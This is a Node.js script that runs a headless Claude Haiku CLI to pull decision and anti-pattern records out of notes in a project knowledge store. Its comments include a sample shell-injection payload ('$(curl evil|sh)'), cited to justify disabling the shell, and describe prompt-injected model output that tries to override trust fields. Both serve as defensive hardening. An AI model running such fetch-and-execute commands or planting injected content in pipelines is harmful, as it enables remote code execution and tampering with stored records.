// H11 — note structuring (spec §6 H11, §3.2.6). NOT a registered hook anymore:
// PostToolUse never fires on MCP tool calls (verified CC 2.1.198 —
// research_finding 5e7d0a78, board ccb14030), so the hooks.json registration
// was retired and the MCP server's knowledgeCreate detach-spawns this script
// directly on every note create. The stdin payload keeps the PostToolUse hook
// shape ({cwd, tool_input, tool_response}) so the script runs unchanged; it
// keys on tool_input.type, not the tool name.
//
// PLATFORM DELTA (verified at step 5, flagged for approval): the spec names a
// prompt-type (Haiku) handler, but current prompt hooks are READ-ONLY (policy
// decisions; cannot write records). Degraded-loud fallback implemented here:
// a command hook that runs the Haiku extraction via headless `claude -p
// --json-schema` (structured output enforced by the CLI — a bare `claude -p`
// runs the full agentic Claude Code and replies conversationally or fences
// the JSON, so strict parsing failed in the common case; decision 08ec3815) and
// writes the candidates through the one validated store path, each flagged
// derived_unconfirmed + citing the note. Extraction failure or an unavailable
// CLI records check_skipped {note-structuring-h11} — never a silent skip.
// Extractor overridable via STERLING_H11_EXTRACTOR (also how tests inject a
// deterministic extractor).
import { randomUUID } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { homedir } from 'node:os';
import { readStdin, allow, openStore } from './lib/common.mjs';

const input = readStdin();
if (input.tool_input?.type !== 'note') allow();

const noteText = input.tool_input?.fields?.raw_text;
let noteId;
try {
  const response = JSON.parse(input.tool_response?.content?.[0]?.text ?? '{}');
  noteId = response.record?.id;
} catch {
  /* fall through to loud skip */
}

const store = openStore(input.cwd);
if (!store) allow();

function skipLoud(reason) {
  store.recordCheckSkipped('note-structuring-h11', reason, store.getRun()?.id, new Date().toISOString());
  store.close();
  process.stderr.write(`H11 degraded loudly (${reason}) — note captured, extraction skipped (check_skipped recorded)`);
  process.exit(0);
}

if (!noteText || !noteId) skipLoud('note_payload_unreadable');

const PROMPT = [
  'Extract durable knowledge candidates from this raw note.',
  'A candidate is a decision (title, statement, alternatives_rejected as {option,reason} objects, rationale)',
  'or an anti_pattern (title, trigger, guidance, wrong_way, right_way, source_evidence).',
  'Only include candidates genuinely supported by the note text; an empty candidates array is a fine answer.',
  `NOTE: ${noteText}`,
].join('\n');

// The API's structured-output tool requires a top-level object, so the array
// rides under "candidates"; the worker unwraps it below. The extractor seam
// emits the same shape — the seam substitutes the claude invocation 1:1.
// The per-type anyOf mirrors the store's zod field shapes so candidates are
// valid on the first pass: the detached worker's stderr goes nowhere, so a
// zod rejection at store.create is invisible in production — shape errors
// must be prevented here, not recovered there (zod stays the backstop).
const SCHEMA = JSON.stringify({
  type: 'object',
  properties: {
    candidates: {
      type: 'array',
      items: {
        anyOf: [
          {
            type: 'object',
            properties: {
              type: { type: 'string', enum: ['decision'] },
              fields: {
                type: 'object',
                properties: {
                  title: { type: 'string' },
                  statement: { type: 'string' },
                  alternatives_rejected: {
                    type: 'array',
                    items: {
                      type: 'object',
                      properties: { option: { type: 'string' }, reason: { type: 'string' } },
                      required: ['option', 'reason'],
                    },
                  },
                  rationale: { type: 'string' },
                },
                required: ['title', 'statement', 'alternatives_rejected', 'rationale'],
              },
            },
            required: ['type', 'fields'],
          },
          {
            type: 'object',
            properties: {
              type: { type: 'string', enum: ['anti_pattern'] },
              fields: {
                type: 'object',
                properties: {
                  title: { type: 'string' },
                  trigger: { type: 'string' },
                  guidance: { type: 'string' },
                  wrong_way: { type: 'string' },
                  right_way: { type: 'string' },
                  source_evidence: { type: 'string' },
                },
                required: ['title', 'trigger', 'guidance', 'wrong_way', 'right_way', 'source_evidence'],
              },
            },
            required: ['type', 'fields'],
          },
        ],
      },
    },
  },
  required: ['candidates'],
});

// NOTE raw_text is embedded in PROMPT, so the claude spawn must NOT use a shell
// (shell:true joins argv into one /bin/sh -c string, making note text a shell-
// injection vector — a note like `$(curl evil|sh)` would execute; HIGH finding
// after the server-side trigger made this reachable on every note create,
// decision c6f9f0e0). shell:false passes PROMPT as one discrete argv element:
// libuv PATH-resolves `claude` and the note text is never interpreted by a
// shell. STERLING_H11_EXTRACTOR (test seam) was already shell:false. A missing
// claude on PATH still degrades loud (claude_cli_unavailable), never silent.
// Invocation hardening (decision 08ec3815, verified against CC 2.1.198):
// --json-schema makes the CLI enforce the output shape (raw JSON object on
// stdout — no prose, no fences); --tools '' + --safe-mode strip agentic tools
// and this repo's CLAUDE.md/hooks/plugins/MCP from the spawned session (the
// extraction needs none of it, and safe-mode keeps OAuth working where --bare
// would not); --no-session-persistence stops every note create littering a
// session file. Model pinned to an exact id — a bare alias silently drifts to
// new versions; a swap must be deliberate. input:'' closes stdin (an open pipe
// costs a 3s CLI wait). A future CLI that drops a flag exits non-zero →
// claude_cli_unavailable, loud as ever.
const extractor = process.env.STERLING_H11_EXTRACTOR;
// Native Windows (the second launcher, decision 67350de4): claude's install dir
// %USERPROFILE%\.local\bin is NOT reliably on PATH — the native launcher itself
// calls claude.exe by absolute path for the same reason (anti_pattern 6ac730b1)
// — and libuv's shell:false search never resolves an npm claude.cmd shim. So on
// win32 prefer the canonical native claude.exe when it exists; the bare name
// everywhere else keeps POSIX byte-identical and still covers a PATH-reachable
// claude.exe. A miss still degrades loud (claude_cli_unavailable). Verified
// live under Windows node v24.14.0: bare 'claude' is ENOENT on the registry
// PATH, the absolute .exe runs (decision 2d6da80f).
const nativeWinClaude = join(homedir(), '.local', 'bin', 'claude.exe');
const claudeCmd = process.platform === 'win32' && existsSync(nativeWinClaude) ? nativeWinClaude : 'claude';
const result = extractor
  ? spawnSync(process.execPath, [extractor], { input: PROMPT, encoding: 'utf8', timeout: 90_000 })
  : spawnSync(
      claudeCmd,
      ['-p', PROMPT, '--model', 'claude-haiku-4-5-20251001', '--json-schema', SCHEMA, '--tools', '', '--safe-mode', '--no-session-persistence'],
      { input: '', encoding: 'utf8', timeout: 90_000 }
    );

if (result.error || result.status !== 0) skipLoud(extractor ? 'extractor_failed' : 'claude_cli_unavailable');

let candidates;
try {
  candidates = JSON.parse(String(result.stdout).trim()).candidates;
  if (!Array.isArray(candidates)) throw new Error('not an array');
} catch {
  skipLoud('extraction_unparseable');
}

const created = [];
const now = new Date().toISOString();
for (const cand of candidates) {
  try {
    // cand.fields is untrusted (Haiku output steered by attacker-influenceable
    // note text), so it is spread FIRST and every trust-bearing envelope field
    // is set AFTER it — a prompt-injected candidate can supply CONTENT
    // (title/statement/rationale/…) but can never override derived_unconfirmed,
    // author, status, scope, links, id, or type to smuggle a confirmed-looking
    // record into default retrieval (HIGH finding, decision c6f9f0e0).
    const record = store.create({
      ...cand.fields,
      id: randomUUID(),
      type: cand.type,
      created_at: now,
      updated_at: now,
      author: 'agent:note-structurer',
      status: 'active',
      superseded_by: null,
      links: [{ rel: 'cites', target_id: noteId }],
      scope: 'project',
      stack_tags: [],
      derived_unconfirmed: true, // §3.2.6: lower-trust; excluded from retrieval unless opted in
    });
    created.push(record.id);
  } catch (e) {
    process.stderr.write(`H11: candidate rejected by schema (${e.message}); skipping it\n`);
  }
}
if (created.length) store.appendNoteDerived(noteId, created);
store.close();
console.log(`H11: ${created.length} derived_unconfirmed candidate(s) extracted from note ${noteId}`);
allow();
